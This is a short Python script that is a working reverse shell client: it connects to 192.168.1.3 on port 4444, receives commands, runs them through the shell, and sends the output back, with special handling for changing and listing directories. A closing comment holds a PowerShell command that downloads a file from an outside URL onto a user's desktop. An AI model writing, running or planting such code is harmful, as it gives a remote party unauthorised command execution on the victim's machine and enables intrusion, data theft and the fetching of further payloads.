from socket import *
import os
import subprocess

client = socket(AF_INET, SOCK_STREAM)
client.connect(("192.168.1.3",4444))

while True:
    location = os.popen('cd').read()
    result2 = " ".join(location) + ">>> "
    client.sendall(result2.encode())

    data = client.recv(2048).decode()
    subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    if 'PowerShell' in data:
        client.sendall(data.encode())

    elif data == 'cd' or data == 'cd ':
        pwd = os.popen('cd').read()
        pwd = "[+] You are at: "+"".join(pwd)
        client.sendall(pwd.encode())

    elif 'cd' in data:
        dic = data[3:]
        os.chdir(dic)
        last = f"[+] Changed directory to {dic}"
        client.sendall(last.encode())

    elif 'dir' == data:
        directory = next(os.walk('.'))[2] + next(os.walk('.'))[1]
        pwd = os.popen('cd')
        loc = "".join(pwd)
        result = "The directory is: " + loc + '\n' + "\n".join(directory)
        client.sendall(result.encode())

    else:
        try:
            subprocess.Popen(data, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            result = os.popen(data).read()
            client.sendall(result.encode())
        except:
            client.sendall("[-] Bad command".encode())
            continue


#PowerShell (New-object system.net.webclient).downloadfile('https://cdn.istores.co.il/image/upload/if_ar_gt_2:1/c_fill,h_662,w_555/c_fill,h_662,w_555/if_else/c_fill,q_100,w_555/if_end/dpr_2/v1565347620/clients/16714/9844be013798da44193c7e46a6d9a1963661ceaa.jpg','C:\Users\shonb\OneDrive\Desktop\image.jpg');